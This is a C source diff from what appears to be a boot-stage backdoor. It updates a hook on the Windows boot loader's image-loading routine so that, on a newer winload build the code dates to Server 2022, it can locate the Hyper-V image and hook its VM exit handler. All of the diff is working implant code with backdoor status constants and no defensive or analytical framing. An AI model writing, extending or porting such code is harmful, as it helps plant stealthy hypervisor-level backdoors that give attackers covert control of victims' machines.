@@ -352,6 +352,9 @@ UINT64 __stdcall new_BlLdrLoadImage(
     VOID *arg_07, VOID *arg_08, VOID *arg_09, VOID *arg_10, VOID *arg_11, VOID *arg_12,
     VOID *arg_13, VOID *arg_14, VOID *arg_15, VOID *arg_16, VOID *arg_17, VOID *arg_18)
 {
+    UINT16 *pPath = NULL;
+    LDR_DATA_TABLE_ENTRY *pLdrEntry = NULL;
+
     // just in case
     ConsoleDisable();
 
@@ -361,15 +364,39 @@ UINT64 __stdcall new_BlLdrLoadImage(
         arg_13, arg_14, arg_15, arg_16, arg_17, arg_18
     );
 
-#if defined(BACKDOOR_DEBUG_IMAGE_LOAD)
+    if (arg_02 == NULL)
+    {
+        /*
+            Check for more recent winload version as seen on Windows Server 2022 10.0.20348:
 
-    if (arg_03)
+                mov     r8, rdx
+                and     [rsp+0C8h+var_68], 0
+                xor     edx, edx                 ; <--- arg_02 is zero
+                and     [rsp+0C8h+var_70], 0
+                and     [rsp+0C8h+var_78], 0
+                and     qword ptr [r11-80h], 0
+                mov     [rsp+0C8h+var_88], rax
+                lea     rax, LdrModuleList
+                mov     [rsp+0C8h+var_90], rax
+                mov     [rsp+0C8h+var_98], 4000h
+                mov     [rsp+0C8h+var_A0], 0D0000002h
+                and     [rsp+0C8h+var_A8], 0
+                call    BlLdrLoadImage
+        */
+        pPath = (UINT16 *)arg_03;
+        pLdrEntry = *(LDR_DATA_TABLE_ENTRY **)arg_09;
+    }
+    else
+    {
+        // use older winload version
+        pPath = (UINT16 *)arg_02;
+        pLdrEntry = *(LDR_DATA_TABLE_ENTRY **)arg_08;
+    }
+
+    if (pPath)
     {
         int Size = 0;
         char szModulePath[MAX_MODULE_NAME_SIZE];
-
-        // second argument contains module path
-        UINT16 *pPath = (UINT16 *)arg_03;
 
         while (*(pPath + Size) != 0 && Size < MAX_MODULE_NAME_SIZE - 1)
         {
@@ -383,30 +410,25 @@ UINT64 __stdcall new_BlLdrLoadImage(
         DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Status = 0x%X, Path = \"%s\"\r\n", Status, szModulePath);
     }
     else
-
-#endif
-
     {
         DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Status = 0x%X\r\n", Status);
     }
 
     if (Status == 0)
     {
-        if (arg_08)
+        if (pLdrEntry)
         {
-            LDR_DATA_TABLE_ENTRY *LdrEntry = *(LDR_DATA_TABLE_ENTRY **)arg_08;
-
             // check for the Hyper-V image
-            if (m_HvInfo.ImageBase == NULL && LdrGetProcAddress(LdrEntry->DllBase, "HvImageInfo") != NULL)
+            if (m_HvInfo.ImageBase == NULL && LdrGetProcAddress(pLdrEntry->DllBase, "HvImageInfo") != NULL)
             {
                 m_HvInfo.Status = BACKDOOR_ERR_HYPER_V_EXIT;
-                m_HvInfo.ImageBase = LdrEntry->DllBase;
-                m_HvInfo.ImageEntry = LdrEntry->EntryPoint;
+                m_HvInfo.ImageBase = pLdrEntry->DllBase;
+                m_HvInfo.ImageEntry = pLdrEntry->EntryPoint;
 
                 DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Hyper-V image is at "FPTR"\r\n", m_HvInfo.ImageBase);
 
                 // locate and hook VM exit handler
-                if ((m_HvInfo.VmExit = HyperVHook(LdrEntry->DllBase)) != NULL)
+                if ((m_HvInfo.VmExit = HyperVHook(m_HvInfo.ImageBase)) != NULL)
                 {
                     m_HvInfo.Status = BACKDOOR_SUCCESS;
                 }
